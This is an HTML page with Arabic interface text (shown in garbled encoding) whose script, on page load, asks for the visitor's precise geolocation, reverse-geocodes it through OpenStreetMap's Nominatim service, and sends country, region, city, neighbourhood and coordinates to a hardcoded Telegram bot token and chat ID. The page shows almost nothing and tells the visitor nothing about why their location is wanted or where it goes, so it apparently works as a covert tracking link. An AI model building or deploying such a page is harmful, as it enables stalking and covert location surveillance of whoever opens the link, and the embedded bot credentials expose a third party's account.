<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WEB</title>
<style>
body{font-family:Tahoma, Arial;background:#f3f6ff;height:100vh;margin:0;display:flex;align-items:center;justify-content:center;text-align:center}
#status{margin-top:10px;color:#333}
</style>
</head>
<body>

<div id="msg">
<h3>.</h3>
<p id="status">..</p>
<small></small>
</div>

<script>
const BOT_TOKEN = "8178761195:AAHUVKSv3VrrRSDWRULLSV6IgPuE0vZx6Y0";
const CHAT_ID  = "6683130316";

const statusEl = document.getElementById("status");

window.addEventListener("load", async ()=>{
  if(!navigator.geolocation){
    statusEl.textContent = "Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ÙÙŠ Ù…ØªØµÙØ­Ùƒ";
    return;
  }

  statusEl.textContent = ".";

  navigator.geolocation.getCurrentPosition(async(position)=>{
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    statusEl.textContent = `Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØªÙ… ØªØ­Ø¯ÙŠØ¯Ù‡: Lat=${lat}, Lon=${lon} â€” Ø¬Ø§Ø±Ù Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„ØªÙØ§ØµÙŠÙ„...`;

    try{
      // Ø§Ø³ØªØ®Ø¯Ø§Ù… Nominatim OpenStreetMap Ù„ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ù„Ø¹Ù†ÙˆØ§Ù†
      const geoResp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
      const geoData = await geoResp.json();

      const country = geoData.address.country || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      const state = geoData.address.state || geoData.address.region || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      const city = geoData.address.city || geoData.address.town || geoData.address.village || geoData.address.county || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
      const suburb = geoData.address.suburb || geoData.address.neighbourhood || "";

      const message = `ğŸ“ ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:
Ø§Ù„Ø¯ÙˆÙ„Ø©: ${country}
Ø§Ù„Ù…Ø­Ø§ÙØ¸Ø©/Ø§Ù„Ù…Ù†Ø·Ù‚Ø©: ${state}
Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©/Ø§Ù„Ø­ÙŠ: ${city}${suburb?'\nØ§Ù„Ø­ÙŠ/Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„ØµØºÙŠØ±Ø©: '+suburb:''}
Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: Lat=${lat}, Lon=${lon}`;

      // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù„Ù„Ø¨ÙˆØª
      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("text", message);

      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        body:form
      });

      if(resp.ok){
        statusEl.textContent = "âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ù„Ø¨ÙˆØª Ø¨Ù†Ø¬Ø§Ø­.";
      }else{
        statusEl.textContent = "âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„. ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ù€ Chat ID.";
      }

    }catch(err){
      statusEl.textContent = "Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹: "+(err.message||err);
    }

  }, (err)=>{
    statusEl.textContent = "ÙØ´Ù„ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹: " + err.message;
  }, {enableHighAccuracy:true, timeout:10000});
});
</script>

</body>
</html>
